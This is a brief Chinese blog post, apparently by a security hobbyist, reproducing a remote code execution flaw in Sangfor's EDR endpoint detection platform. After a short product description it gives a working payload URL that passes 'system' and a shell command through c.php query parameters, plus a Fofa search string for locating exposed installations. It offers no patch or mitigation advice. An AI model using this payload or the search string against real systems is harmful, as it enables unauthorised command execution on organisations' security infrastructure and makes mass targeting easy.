# 深X服 EDR终端检测系统RCE漏洞复现




#### 简介

深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。



#### EDR的界面

<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/rce11.jpg"></img>





#### RCE Payload

```bash
https://xxx.com:xxx/tool/log/c.php?strip_slashes=system&host=id
```

<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/rce22.jpg"></img>





#### **Fofa关键字** 

```bash
title="终端检测响应平台"
```



---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/%E6%B7%B1x%E6%9C%8D-edr%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9Frce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/  

